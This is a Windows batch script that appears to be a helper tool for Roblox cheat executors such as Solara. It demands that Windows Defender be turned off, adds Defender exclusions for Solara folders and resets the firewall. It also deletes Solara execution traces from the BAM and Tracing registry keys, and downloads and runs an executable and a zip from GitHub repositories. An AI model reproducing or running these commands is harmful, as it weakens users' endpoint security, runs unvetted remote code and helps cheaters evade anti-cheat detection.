@echo off
set "powershellPath=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
title D4R4N0X-V0.1B
chcp 65001 >nul
:MENU
cls
Color 0C & Mode con cols=87 lines=30
echo.
echo    ▄████████ ███    █▄     ▄███████▄    ▄███████▄  ▄██████▄     ▄████████     ███     
echo   ███    ███ ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ ▀█████████▄ 
echo   ███    █▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███    ▀███▀▀██ 
echo   ███        ███    ███   ███    ███   ███    ███ ███    ███  ▄███▄▄▄▄██▀     ███   ▀ 
echo ▀███████████ ███    ███ ▀█████████▀  ▀█████████▀  ███    ███ ▀▀███▀▀▀▀▀       ███     
echo          ███ ███    ███   ███          ███        ███    ███ ▀███████████     ███     
echo    ▄█    ███ ███    ███   ███          ███        ███    ███   ███    ███     ███     
echo  ▄████████▀  ████████▀   ▄████▀       ▄████▀       ▀██████▀    ███    ███    ▄████▀   
echo                                                               ███    ███          
echo.   
echo        ▄████████    ▄████████ ███▄▄▄▄       ███        ▄████████    ▄████████          
echo       ███    ███   ███    ███ ███▀▀▀██▄ ▀█████████▄   ███    ███   ███    ███          
echo       ███    █▀    ███    █▀  ███   ███    ▀███▀▀██   ███    █▀    ███    ███          
echo       ███         ▄███▄▄▄     ███   ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀          
echo       ███        ▀▀███▀▀▀     ███   ███     ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀            
echo       ███    █▄    ███    █▄  ███   ███     ███       ███    █▄  ▀███████████          
echo       ███    ███   ███    ███ ███   ███     ███       ███    ███   ███    ███          
echo       ████████▀    ██████████  ▀█   █▀     ▄████▀     ██████████   ███    ███          
echo                                                                    ███    ███          




echo.
echo [1].{Clean roblox/exploits/bloxstrap/etc} - (Velocity, Solara) (OFFLINE)
echo [2].{Fix Solara version Missmatch} 
echo [3].{Downgrade Roblox Version} - (Bloxstrap)
echo [4].{Download Bloxstrap} - (Fast and Safe) (OFFLINE)
echo.
echo [5]. Exit {Autodelete this bat}
echo.
set /p choice=(1-5) SELECT: 

if "%choice%"=="1" goto CLEAR
if "%choice%"=="2" goto FIXEXPL
if "%choice%"=="3" goto DOWNGRADEROBLOX
if "%choice%"=="4" goto OFFLINE
if "%choice%"=="5" exit

goto MENU

:OFFLINE
cls
echo.
echo FUCK YOU >:()
pause
goto MENU

:DOWNGRADEROBLOX
cls
Color 0E & Mode con cols=54 lines=27
echo /====================================================\
echo  \\\...Downloading and Running Roblox Downgrader...\\\
echo \====================================================/
"%powershellPath%" -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ActualMasterOogway/Roblox-Downgrader/main/RobloxDowngrader.exe' -OutFile '%temp%\RobloxDowngrader.exe'; Start-Process '%temp%\RobloxDowngrader.exe' -Wait"

if %errorlevel% neq 0 (
    color 0C
    echo /====================================================\
    echo \\\.....ERROR: Failed to run Roblox Downgrader.....\\\
    echo \====================================================/
) else (
    echo /====================================================\
    echo \\\...Successfully fixed Roblox version mismatch...\\\
    echo \====================================================/
)
pause
goto MENU
pause

:CLEAR
cls
color 09
echo /====================================================\
echo            \\\.....S.T.A.R.T.E.D...\\\        
echo \====================================================/
echo.

:: Check if Windows Defender is enabled
powershell -Command "& {(Get-MpComputerStatus).RealTimeProtectionEnabled}" | findstr "True" >nul
if %errorlevel%==0 (
    color 0C
    cls
    echo /====================================================\
    echo     1ERR- Windows Defender is enabled. Turn it off.        
    echo /====================================================/
    pause
    goto MENU
)

:: Kill processes before checking
for %%p in (RobloxPlayerBeta.exe Velocity.exe "Roblox Game Client.exe" Bloxstrap.exe Solara.exe) do (
    taskkill /IM %%p /F >nul 2>&1
    tasklist /FI "IMAGENAME eq %%p" 2>NUL | find /I "%%p" >NUL && (
        color 0C
        cls
        echo /====================================================\
        echo      1ERR- %%p needs to be closed.
        echo /====================================================/
        pause
        goto MENU
    )
)

echo /====================================================\
echo    \\\...Deleting Temp Files of Roblox...\\\             /---1\15---\
echo \====================================================/
rd /s /q %temp%\Roblox*
cls

echo /====================================================\
echo        \\\...Deleting Bloxstrap Logs...\\\               /---2\15---\
echo \====================================================/
rd /s /q %localappdata%\Bloxstrap\Logs*
cls

echo /====================================================\
echo    \\\...Deleting Solara from Register ...\\\            /---3\15---\ //Wait some time//
echo \====================================================/
setlocal enabledelayedexpansion
for /f "tokens=*" %%A in ('reg query "HKLM\SYSTEM\ControlSet001\Services\bam\State\UserSettings" /s /f "Solara" 2^>nul ^| findstr "HKEY"') do (
    reg delete "%%A" /f >nul 2>&1
)
for /f "tokens=*" %%B in ('reg query "HKLM\SOFTWARE\Microsoft\Tracing" /s /f "Solara" 2^>nul ^| findstr "HKEY"') do (
    reg delete "%%B" /f >nul 2>&1
)

cls


echo /====================================================\
echo   \\\...Deleting Roblox from AppData\Local...\\\         /---4\15---\
echo \====================================================/

cd /d "%localappdata%\Roblox"

for /d %%i in (*) do (
    if /i not "%%i"=="LocalStorage" (
        rmdir /s /q "%%i"
    )
)

for %%f in (*.*) do (
    echo %%f | find /i "Cookies" > nul
    if errorlevel 1 (
        del /q "%%f"
    )
)

cls


echo /====================================================\
echo  \\\...Clearing Potential Downgrades + Versions..\\\     /---5\15---\
echo \====================================================/
attrib -h -s -r %localappdata%\Bloxstrap\Versions\* /s /d
attrib -h -s -r %localappdata%\Roblox\Versions\* /s /d
rd /s /q %localappdata%\Bloxstrap\Versions\
rd /s /q %localappdata%\Roblox\Versions\
cls

echo /====================================================\
echo \\\...Cleaning Roblox Files from Program Files..\\\      /---6\15---\
echo \====================================================/
rd /s /q %localappdata%\\Roblox\\LocalStorage\\*
rd /s /q %localappdata%\\Roblox\\logs\\*
cls

echo /====================================================\
echo      \\\...Deleting Roblox in Registry...\\\             /---7\15---\
echo \====================================================/
reg delete "HKEY_CURRENT_USER\Software\Roblox" /f > NUL 2>&1
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Roblox" /f > NUL 2>&1
cls

echo /====================================================\
echo      \\\...Deleting Velocity in Registry...\\\           /---8\15---\ //Wait some time//
echo \====================================================/

echo /====================================================\
echo          \\\...Cleaning Original Roblox...\\\             /---9\15---\
echo \====================================================/
for %%f in (%USERPROFILE%\AppData\LocalLow\Roblox\*.*) do (
    echo %%~nxf | find /i "Cookies" > NUL
    if errorlevel 1 (
        del /q "%%f"
    )
)
cls

echo /====================================================\  
echo        \\\...Resetting Network and DNS...\\\             /---10\15---\
echo \====================================================/

echo \\\...Resetting Network and DNS...\\\
net stop dnscache
net stop nlasvc

echo \\\...Resetting network components...\\\
netsh int ip reset
netsh winsock reset
netsh advfirewall reset

echo \\\...Flushing DNS...\\\
ipconfig /flushdns
ipconfig /registerdns

echo \\\...Renewing IP address...\\\
start /b ipconfig /release 
start /b ipconfig /renew 

echo \\\...Restarting network services...\\\
net start Dhcp 
net start dnscache
net start nlasvc 
cls

echo /====================================================\  
echo        \\\...Adding to Windows WhiteList...\\\           /---11\15---\
echo \====================================================/
powershell -Command "Add-MpPreference -ExclusionPath \"$env:USERPROFILE\AppData\Local\Temp\Solara.Dir\""
powershell -Command "Add-MpPreference -ExclusionPath \"$env:ProgramData\Solara\""
cls

echo /====================================================\  
echo    \\\... ...\\\      /---12\15---\
echo \====================================================/

cls

cls
echo /====================================================\ 
echo       \\\...Roblox files deletion complete!...\\\      
echo                   /---FINISHED---\
echo \====================================================/
pause
goto MENU


:FIXEXPL
cls
Color 0E & Mode con cols=54 lines=27
echo /====================================================\
echo      \\\...Downloading Solara from github...\\\               
echo \====================================================/
powershell -Command "Invoke-WebRequest -Uri https://github.com/Pikinez/ssl/raw/refs/heads/main/Solara.zip -OutFile %TEMP%\Solara.zip"
if exist %TEMP%\Solara.zip (
    cls
    color 0E
    echo /====================================================\
    echo             \\\...Unpacking Solara...\\\               
    echo \====================================================/
    powershell -Command "Expand-Archive -Path %TEMP%\Solara.zip -DestinationPath %programdata% -Force"
    del %TEMP%\Solara.zip
    cls
    echo /====================================================\
    echo    \\\...Solara was downloaded and installed...\\\               
    echo \====================================================/
) else (
    color 0C
    echo /====================================================\
    echo      \\\...Error, Solara was not downloaded...\\\               
    echo \====================================================/
)
pause
goto MENU

